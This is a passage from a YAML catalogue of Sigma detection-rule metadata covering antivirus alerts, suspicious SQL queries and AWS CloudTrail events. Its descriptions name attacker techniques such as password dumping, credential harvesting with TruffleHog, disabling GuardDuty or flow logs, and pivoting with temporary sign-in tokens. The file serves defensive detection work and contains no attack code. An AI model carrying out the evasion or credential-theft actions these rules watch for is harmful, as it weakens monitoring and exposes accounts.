  - https://www.virustotal.com/gui/file/8f8daabe1c8ceb5710949283818e16c4aa8059bf2ce345e2f2c90b8692978424
  - https://www.virustotal.com/gui/file/d9669f7e3eb3a9cdf6a750eeb2ba303b5ae148a43e36546896f1d1801e912466
  false_positives:
  - Unlikely
  notes: ''
- detection_id: fa0c05b6-8ad3-468d-8231-c1cbccb64fba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/category/antivirus/av_hacktool.yml
  name: Antivirus Hacktool Detection
  description: 'Detects a highly relevant Antivirus alert that reports a hack tool
    or other attack tool.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: stable
  platform: ''
  product: ''
  category: antivirus
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204
  tags:
  - attack.execution
  - attack.t1204
  time_window: ''
  references:
  - https://www.nextron-systems.com/2021/08/16/antivirus-event-analysis-cheat-sheet-v1-8-2/
  - https://www.nextron-systems.com/?s=antivirus
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 78cc2dd2-7d20-4d32-93ff-057084c38b93
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/category/antivirus/av_password_dumper.yml
  name: Antivirus Password Dumper Detection
  description: 'Detects a highly relevant Antivirus alert that reports a password
    dumper.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: stable
  platform: ''
  product: ''
  category: antivirus
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1003.001
  - T1003.002
  - T1558
  tags:
  - attack.credential-access
  - attack.t1003
  - attack.t1558
  - attack.t1003.001
  - attack.t1003.002
  time_window: ''
  references:
  - https://www.nextron-systems.com/?s=antivirus
  - https://www.virustotal.com/gui/file/5fcda49ee7f202559a6cbbb34edb65c33c9a1e0bde9fa2af06a6f11b55ded619
  - https://www.virustotal.com/gui/file/a4edfbd42595d5bddb442c82a02cf0aaa10893c1bf79ea08b9ce576f82749448
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4c6ca276-d4d0-4a8c-9e4c-d69832f8671f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/category/antivirus/av_ransomware.yml
  name: Antivirus Ransomware Detection
  description: 'Detects a highly relevant Antivirus alert that reports ransomware.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: antivirus
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.t1486
  - attack.impact
  time_window: ''
  references:
  - https://www.nextron-systems.com/?s=antivirus
  - https://www.virustotal.com/gui/file/43b0f7872900bd234975a0877744554f4f355dc57505517abd1ef611e1ce6916
  - https://www.virustotal.com/gui/file/c312c05ddbd227cbb08958876df2b69d0f7c1b09e5689eb9d93c5b357f63eff7
  - https://www.virustotal.com/gui/file/20179093c59bca3acc6ce9a4281e8462f577ffd29fd7bf51cf2a70d106062045
  - https://www.virustotal.com/gui/file/554db97ea82f17eba516e6a6fdb9dc04b1d25580a1eb8cb755eeb260ad0bd61d
  - https://www.virustotal.com/gui/file/69fe77dd558e281621418980040e2af89a2547d377d0f2875502005ce22bc95c
  - https://www.virustotal.com/gui/file/6f0f20da34396166df352bf301b3c59ef42b0bc67f52af3d541b0161c47ede05
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c9a88268-0047-4824-ba6e-4d81ce0b907c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/category/antivirus/av_relevant_files.yml
  name: Antivirus Relevant File Paths Alerts
  description: 'Detects an Antivirus alert in a highly relevant file path or with
    a relevant file name.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: antivirus
  data_sources: []
  tactics: []
  techniques:
  - T1588
  tags:
  - attack.resource-development
  - attack.t1588
  time_window: ''
  references:
  - https://www.nextron-systems.com/?s=antivirus
  false_positives:
  - Unlikely
  notes: ''
- detection_id: fdf135a2-9241-4f96-a114-bb404948f736
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/category/antivirus/av_webshell.yml
  name: Antivirus Web Shell Detection
  description: 'Detects a highly relevant Antivirus alert that reports a web shell.

    It''s highly recommended to tune this rule to the specific strings used by your
    anti virus solution by downloading a big WebShell repository from e.g. github
    and checking the matches.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: antivirus
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://www.nextron-systems.com/?s=antivirus
  - https://github.com/tennc/webshell
  - https://www.virustotal.com/gui/file/bd1d52289203866645e556e2766a21d2275877fbafa056a76fe0cf884b7f8819/detection
  - https://www.virustotal.com/gui/file/308487ed28a3d9abc1fec7ebc812d4b5c07ab025037535421f64c60d3887a3e8/detection
  - https://www.virustotal.com/gui/file/7d3cb8a8ff28f82b07f382789247329ad2d7782a72dde9867941f13266310c80/detection
  - https://www.virustotal.com/gui/file/e841675a4b82250c75273ebf0861245f80c6a1c3d5803c2d995d9d3b18d5c4b5/detection
  - https://www.virustotal.com/gui/file/a80042c61a0372eaa0c2c1e831adf0d13ef09feaf71d1d20b216156269045801/detection
  - https://www.virustotal.com/gui/file/b219f7d3c26f8bad7e175934cd5eda4ddb5e3983503e94ff07d39c0666821b7e/detection
  - https://www.virustotal.com/gui/file/b8702acf32fd651af9f809ed42d15135f842788cd98d81a8e1b154ee2a2b76a2/detection
  - https://www.virustotal.com/gui/file/13ae8bfbc02254b389ab052aba5e1ba169b16a399d9bc4cb7414c4a73cd7dc78/detection
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d84c0ded-edd7-4123-80ed-348bb3ccc4d5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/category/database/db_anomalous_query.yml
  name: Suspicious SQL Query
  description: Detects suspicious SQL query keywrods that are often used during recon,
    exfiltration or destructive activities. Such as dropping tables and selecting
    wildcard fields
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: database
  data_sources: []
  tactics:
  - Exfiltration
  - Persistence
  techniques:
  - T1190
  - T1505.001
  tags:
  - attack.exfiltration
  - attack.initial-access
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1190
  - attack.t1505.001
  time_window: ''
  references:
  - https://github.com/sqlmapproject/sqlmap
  false_positives:
  - Inventory and monitoring activity
  - Vulnerability scanners
  - Legitimate applications
  notes: ''
- detection_id: 39c9f26d-6e3b-4dbb-9c7a-4154b0281112
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_bucket_deleted.yml
  name: AWS Bucket Deleted
  description: 'Detects the deletion of S3 buckets in AWS CloudTrail logs.

    Monitoring the deletion of S3 buckets is critical for security and data integrity,
    as it may indicate potential data loss or unauthorized access attempts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://docs.aws.amazon.com/AmazonS3/latest/API/API_DeleteBucket.html
  - https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/delete-bucket.html
  false_positives:
  - During maintenance operations or testing, authorized administrators may delete
    S3 buckets as part of routine data management or cleanup activities.
  notes: ''
- detection_id: 6393e346-1977-46ef-8987-ad414a145fad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_console_login_failed_authentication.yml
  name: AWS ConsoleLogin Failed Authentication
  description: 'Detects failed AWS console login attempts due to authentication failures.
    Monitoring these events is crucial for identifying potential brute-force attacks
    or unauthorized access attempts to AWS accounts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1110
  tags:
  - attack.credential-access
  - attack.t1110
  time_window: ''
  references:
  - https://naikordian.github.io/blog/posts/brute-force-aws-console/
  - https://help.fortinet.com/fsiem/Public_Resource_Access/7_2_1/rules/PH_RULE_AWS_Management_Console_Brute_Force_of_Root_User_Identity.htm
  - https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1110.001/aws_login_failure/aws_cloudtrail_events.json
  false_positives:
  - Legitimate failed login attempts by authorized users. Investigate the source of
    repeated failed login attempts.
  notes: ''
- detection_id: 77caf516-34e5-4df9-b4db-20744fea0a60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_console_login_success_without_mfa.yml
  name: AWS Successful Console Login Without MFA
  description: 'Detects successful AWS console logins that were performed without
    Multi-Factor Authentication (MFA).

    This alert can be used to identify potential unauthorized access attempts, as
    logging in without MFA can indicate compromised credentials or misconfigured security
    settings.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078.004
  time_window: ''
  references:
  - https://securitylabs.datadoghq.com/cloud-security-atlas/vulnerabilities/iam-user-without-mfa/
  - https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4db60cc0-36fb-42b7-9b58-a5b53019fb74
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_disable_logging.yml
  name: AWS CloudTrail Important Change
  description: Detects disabling, deleting and updating of a Trail
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.008
  tags:
  - attack.defense-evasion
  - attack.t1562.008
  time_window: ''
  references:
  - https://docs.aws.amazon.com/awscloudtrail/latest/userguide/best-practices-security.html
  false_positives:
  - Valid change in a Trail
  notes: ''
- detection_id: d2656e78-c069-4571-8220-9e0ab5913f19
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_guardduty_detector_deleted_or_updated.yml
  name: AWS GuardDuty Detector Deleted Or Updated
  description: 'Detects successful deletion or disabling of an AWS GuardDuty detector,
    possibly by an attacker trying to avoid detection of its malicious activities.

    Upon deletion, GuardDuty stops monitoring the environment and all existing findings
    are lost.

    Verify with the user identity that this activity is legitimate.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  - T1562.008
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  - attack.t1562.008
  time_window: ''
  references:
  - https://docs.aws.amazon.com/guardduty/latest/APIReference/API_DeleteDetector.html
  - https://docs.aws.amazon.com/guardduty/latest/APIReference/API_UpdateDetector.html
  - https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_suspend-disable.html
  - https://docs.datadoghq.com/security/default_rules/719-39f-9cd/
  - https://docs.prismacloud.io/en/enterprise-edition/policy-reference/aws-policies/aws-general-policies/ensure-aws-guardduty-detector-is-enabled
  - https://docs.stellarcyber.ai/5.2.x/Using/ML/Alert-Rule-Based-Potentially_Malicious_AWS_Activity.html
  - https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Amazon%20Web%20Services/Analytic%20Rules/AWS_GuardDutyDisabled.yaml
  - https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/defense_evasion_guardduty_detector_deletion.toml
  - https://help.fortinet.com/fsiem/Public_Resource_Access/7_4_0/rules/PH_RULE_AWS_GuardDuty_Detector_Deletion.htm
  - https://research.splunk.com/sources/5d8bd475-c8bc-4447-b27f-efa508728b90/
  - https://suktech24.com/2025/07/17/aws-threat-detection-rule-guardduty-detector-disabled-or-suspended/
  - https://www.atomicredteam.io/atomic-red-team/atomics/T156001#atomic-test-46---aws---guardduty-suspension-or-deletion
  false_positives:
  - Legitimate detector deletion by an admin (e.g., during account decommissioning).
  - Temporary disablement for troubleshooting (verify via change management tickets).
  - Automated deployment tools (e.g. Terraform) managing GuardDuty state.
  notes: ''
- detection_id: 352a918a-34d8-4882-8470-44830c507aa3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_imds_malicious_usage.yml
  name: Malicious Usage Of IMDS Credentials Outside Of AWS Infrastructure
  description: 'Detects when an instance identity has taken an action that isn''t
    inside SSM.

    This can indicate that a compromised EC2 instance is being used as a pivot point.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1078.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.t1078
  - attack.t1078.002
  time_window: ''
  references:
  - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-identity-roles.html
  - https://ermetic.com/blog/aws/aws-ec2-imds-what-you-need-to-know/
  - https://www.packetmischief.ca/2023/07/31/amazon-ec2-credential-exfiltration-how-it-happens-and-how-to-mitigate-it/#lifting-credentials-from-imds-this-is-why-we-cant-have-nice-things
  false_positives:
  - A team has configured an EC2 instance to use instance profiles that grant the
    option for the EC2 instance to talk to other AWS Services
  notes: ''
- detection_id: e1f7febb-7b94-4234-b5c6-00fb8500f5dd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_new_acl_entries.yml
  name: New Network ACL Entry Added
  description: 'Detects that network ACL entries have been added to a route table
    which could indicate that new attack vectors have been opened up in the AWS account.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.007
  tags:
  - attack.defense-evasion
  - attack.t1562.007
  time_window: ''
  references:
  - https://www.gorillastack.com/blog/real-time-events/important-aws-cloudtrail-security-events-tracking/
  false_positives:
  - Legitimate use of ACLs to enable customer and staff access from the public internet
    into a public VPC
  notes: ''
- detection_id: c803b2ce-c4a2-4836-beae-b112010390b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_new_route_added.yml
  name: New Network Route Added
  description: 'Detects the addition of a new network route to a route table in AWS.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.007
  tags:
  - attack.defense-evasion
  - attack.t1562.007
  time_window: ''
  references:
  - https://www.gorillastack.com/blog/real-time-events/important-aws-cloudtrail-security-events-tracking/
  false_positives:
  - New VPC Creation requiring setup of a new route table
  - New subnets added requiring routing setup
  notes: ''
- detection_id: a840e606-7c8c-4684-9bc1-eb6b6155127f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_pua_trufflehog.yml
  name: PUA - AWS TruffleHog Execution
  description: 'Detects the execution of TruffleHog, a popular open-source tool used
    for scanning repositories for secrets and sensitive information, within an AWS
    environment.

    It has been reported to be used by threat actors for credential harvesting. All
    detections should be investigated to determine if the usage is authorized by security
    teams or potentially malicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1555
  tags:
  - attack.credential-access
  - attack.t1555
  - attack.t1003
  time_window: ''
  references:
  - https://github.com/trufflesecurity/trufflehog
  - https://www.rapid7.com/blog/post/tr-crimson-collective-a-new-threat-group-observed-operating-in-the-cloud/
  false_positives:
  - Legitimate use of TruffleHog by security teams for credential scanning.
  notes: ''
- detection_id: a5ffb6ea-c784-4e01-b30a-deb6e58ca2ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_region_enabled.yml
  name: AWS EnableRegion Command Monitoring
  description: 'Detects the use of the EnableRegion command in AWS CloudTrail logs.

    While AWS has 30+ regions, some of them are enabled by default, others must be
    explicitly enabled in each account separately.

    There may be situations where security monitoring does not cover some new AWS
    regions.

    Monitoring the EnableRegion command is important for identifying potential persistence
    mechanisms employed by adversaries, as enabling additional regions can facilitate
    continued access and operations within an AWS environment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://docs.aws.amazon.com/accounts/latest/reference/API_EnableRegion.html
  - https://awscli.amazonaws.com/v2/documentation/api/2.14.0/reference/account/enable-region.html
  false_positives:
  - Legitimate use of the EnableRegion command by authorized administrators.
  notes: ''
- detection_id: 6fb77778-040f-4015-9440-572aa9b6b580
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_security_group_change_ingress_egress.yml
  name: Ingress/Egress Security Group Modification
  description: 'Detects when an account makes changes to the ingress or egress rules
    of a security group.

    This can indicate that an attacker is attempting to open up new attack vectors
    in the account, that they are trying to exfiltrate data over the network, or that
    they are trying to allow machines in that VPC/Subnet to contact a C&C server.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.gorillastack.com/blog/real-time-events/important-aws-cloudtrail-security-events-tracking/
  false_positives:
  - New VPCs and Subnets being setup requiring a different security profile to those
    already defined
  - A single port being opened for a new service that is known to be deploying
  - Administrators closing unused ports to reduce the attack surface
  notes: ''
- detection_id: 7a4409fc-f8ca-45f6-8006-127d779eaad9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_security_group_change_loadbalancer.yml
  name: LoadBalancer Security Group Modification
  description: 'Detects changes to the security groups associated with an Elastic
    Load Balancer (ELB) or Application Load Balancer (ALB).

    This can indicate that a misconfiguration allowing more traffic into the system
    than required, or could indicate that an attacker is attempting to enable new
    connections into a VPC or subnet controlled by the account.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.gorillastack.com/blog/real-time-events/important-aws-cloudtrail-security-events-tracking/
  false_positives:
  - Repurposing of an ELB or ALB to serve a different or additional application
  - Changes to security groups to allow for new services to be deployed
  notes: ''
- detection_id: 14f3f1c8-02d5-43a2-a191-91ffb52d3015
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_security_group_change_rds.yml
  name: RDS Database Security Group Modification
  description: 'Detects changes to the security group entries for RDS databases.

    This can indicate that a misconfiguration has occurred which potentially exposes
    the database to the public internet, a wider audience within the VPC or that removal
    of valid rules has occurred which could impact the availability of the database
    to legitimate services and users.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.gorillastack.com/blog/real-time-events/important-aws-cloudtrail-security-events-tracking/
  false_positives:
  - Creation of a new Database that needs new security group rules
  notes: ''
- detection_id: 38e7f511-3f74-41d4-836e-f57dfa18eead
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_ssm_malicious_usage.yml
  name: Potential Malicious Usage of CloudTrail System Manager
  description: 'Detect when System Manager successfully executes commands against
    an instance.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1566
  - T1566.002
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.t1566
  - attack.t1566.002
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/blob/v8.6.0/rules/integrations/aws/initial_access_via_system_manager.toml
  false_positives:
  - There are legitimate uses of SSM to send commands to EC2 instances
  - Legitimate users may have to use SSM to perform actions against machines in the
    Cloud to update or maintain them
  notes: ''
- detection_id: e386b9b5-af12-450e-afff-761730fb8a98
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_cloudtrail_vpc_flow_logs_deleted.yml
  name: AWS VPC Flow Logs Deleted
  description: 'Detects the deletion of one or more VPC Flow Logs in AWS Elastic Compute
    Cloud (EC2) through the DeleteFlowLogs API call.

    Adversaries may delete flow logs to evade detection or remove evidence of network
    activity, hindering forensic investigations and visibility into malicious operations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DeleteFlowLogs.html
  - https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/delete-flow-logs.html
  - https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/integrations/aws/defense_evasion_ec2_flow_log_deletion
  false_positives:
  - During maintenance operations or testing, authorized administrators may delete
    VPC Flow Logs as part of routine network management or cleanup activities.
  notes: ''
- detection_id: 07330162-dba1-4746-8121-a9647d49d297
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_config_disable_recording.yml
  name: AWS Config Disabling Channel/Recorder
  description: Detects AWS Config Service disabling
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.008
  tags:
  - attack.defense-evasion
  - attack.t1562.008
  time_window: ''
  references:
  - https://docs.aws.amazon.com/config/latest/developerguide/cloudtrail-log-files-for-aws-config.html
  false_positives:
  - Valid change in AWS Config Service
  notes: ''
- detection_id: f8103686-e3e8-46f3-be72-65f7fcb4aa53
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_console_getsignintoken.yml
  name: AWS Console GetSigninToken Potential Abuse
  description: 'Detects potentially suspicious events involving "GetSigninToken".

    An adversary using the "aws_consoler" tool can leverage this console API to create
    temporary federated credential that help obfuscate which AWS credential is compromised
    (the original access key) and enables the adversary to pivot from the AWS CLI
    to console sessions without the need for MFA using the new access key issued in
    this request.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.007
  - T1550.001
  tags:
  - attack.lateral-movement
  - attack.defense-evasion
  - attack.t1021.007
  - attack.t1550.001
  time_window: ''
  references:
  - https://github.com/NetSPI/aws_consoler
  - https://www.crowdstrike.com/blog/analysis-of-intrusion-campaign-targeting-telecom-and-bpo-companies/
  false_positives:
  - GetSigninToken events will occur when using AWS SSO portal to login and will generate
    false positives if you do not filter for the expected user agent(s), see filter.
    Non-SSO configured roles would be abnormal and should be investigated.
  notes: ''
- detection_id: 20f754db-d025-4a8f-9d74-e0037e999a9a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_delete_identity.yml
  name: SES Identity Has Been Deleted
  description: Detects an instance of an SES identity being deleted via the "DeleteIdentity"
    event. This may be an indicator of an adversary removing the account that carried
    out suspicious or malicious activities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ccd6a6c8-bb4e-4a91-9d2a-07e632819374
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_delete_saml_provider.yml
  name: AWS SAML Provider Deletion Activity
  description: 'Detects the deletion of an AWS SAML provider, potentially indicating
    malicious intent to disrupt administrative or security team access.

    An attacker can remove the SAML provider for the information security team or
    a team of system administrators, to make it difficult for them to work and investigate
    at the time of the attack and after it.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Impact
  - Persistence
  techniques:
  - T1078.004
  - T1531
  tags:
  - attack.t1078.004
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.t1531
  - attack.impact
  time_window: ''
  references:
  - https://docs.aws.amazon.com/IAM/latest/APIReference/API_DeleteSAMLProvider.html
  false_positives:
  - Automated processes using tools like Terraform may trigger this alert.
  - Legitimate administrative actions by authorized system administrators could cause
    this alert. Verify the user identity, user agent, and hostname to ensure they
    are expected.
  - Deletions by unfamiliar users should be investigated. If the behavior is known
    and expected, it can be exempted from the rule.
  notes: ''
- detection_id: a136ac98-b2bc-4189-a14d-f0d0388e57a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_disable_bucket_versioning.yml
  name: AWS S3 Bucket Versioning Disable
  description: Detects when S3 bucket versioning is disabled. Threat actors use this
    technique during AWS ransomware incidents prior to deleting S3 objects.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://invictus-ir.medium.com/ransomware-in-the-cloud-7f14805bbe82
  false_positives:
  - AWS administrator legitimately disabling bucket versioning
  notes: ''
- detection_id: 16124c2d-e40b-4fcc-8f2c-5ab7870a2223
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_ec2_disable_encryption.yml
  name: AWS EC2 Disable EBS Encryption
  description: 'Identifies disabling of default Amazon Elastic Block Store (EBS) encryption
    in the current region.

    Disabling default encryption does not change the encryption status of your existing
    volumes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
